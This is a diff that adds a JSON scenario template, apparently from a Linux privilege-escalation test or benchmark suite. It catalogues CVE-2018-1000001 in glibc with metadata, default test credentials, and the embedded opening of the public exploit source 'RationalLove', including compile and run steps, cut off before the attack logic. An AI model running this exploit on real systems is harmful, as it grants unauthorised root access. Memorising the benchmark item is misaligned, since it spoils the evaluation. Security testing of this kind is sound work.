@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_43775",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: glibc < 2.26 - 'getcwd()' Local Privilege Escalation (CVE-2018-1000001)\n\nExploit source code (43775.c):\n```\n/** This software is provided by the copyright owner \"as is\" and any\n *  expressed or implied warranties, including, but not limited to,\n *  the implied warranties of merchantability and fitness for a particular\n *  purpose are disclaimed. In no event shall the copyright owner be\n *  liable for any direct, indirect, incidential, special, exemplary or\n *  consequential damages, including, but not limited to, procurement\n *  of substitute goods or services, loss of use, data or profits or\n *  business interruption, however caused and on any theory of liability,\n *  whether in contract, strict liability, or tort, including negligence\n *  or otherwise, arising in any way out of the use of this software,\n *  even if advised of the possibility of such damage.\n *\n *  Copyright (c) 2018 halfdog <me (%) halfdog.net>\n *  See https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/ for more information.\n *\n *  This tool exploits a buffer underflow in glibc realpath()\n *  and was tested against latest release from Debian, Ubuntu\n *  Mint. It is intended as demonstration of ASLR-aware exploitation\n *  techniques. It uses relative binary offsets, that may be different\n *  for various Linux distributions and builds. Please send me\n *  a patch when you developed a new set of parameters to add\n *  to the osSpecificExploitDataList structure and want to contribute\n *  them.\n *\n *  Compile: gcc -o RationalLove RationalLove.c\n *  Run: ./RationalLove\n *\n *  You may also use \"--Pid\" parameter, if you want to test the\n *  program on already existing namespaced or chrooted mounts.\n */\n\n#define _GNU_SOURCE\n#include <assert.h>\n#include <errno.h>\n#include <fcntl.h>\n#include <limits.h>\n#include <poll.h>\n#include <sched.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/mount.h>\n#include <sys/stat.h>\n#include <sys/wait.h>\n#include <time.h>\n#include <unistd.h>\n\n\n#define UMOUNT_ENV_VAR_COUNT 256\n\n/** Dump that number of bytes from stack to perform anti-ASLR.\n *  This number should be high enough to reproducible reach the\n *  stack region sprayed with (UMOUNT_ENV_VAR_COUNT*8) bytes of\n *  environment variable references but low enough to avoid hitting\n *  upper stack limit, which would cause a crash.\n */\n#define STACK_LONG_DUMP_BYTES 4096\n\nchar *messageCataloguePreamble=\"Language: en\\n\"\n    \"MIME-Version: 1.0\\n\"\n    \"Content-Type: text/plain; charset=UTF-8\\n\"\n    \"Content-Transfer-Encoding: 8bit\\n\";\n\n/** The pid of a namespace process with the working directory\n *  at a writable /tmp only visible by the process. */\npid_t namespacedProcessPid=-1;\n\nint killNamespacedProcessFlag=1;\n\n/** The pathname to the umount binary to execute. */\nchar *umountPathname;\n\n/** The pathname to the named pipe, that will synchronize umount\n *  binary with supervisory process before triggering the second\n *  and last exploitation phase.\n */\nchar *secondPhaseTriggerPipePathname;\n\n/** The pathname to the second phase exploitation catalogue file.\n *  This is needed as t\n```",
+  "cve": "CVE-2018-1000001",
+  "exploitdb_id": "43775",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_43775",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
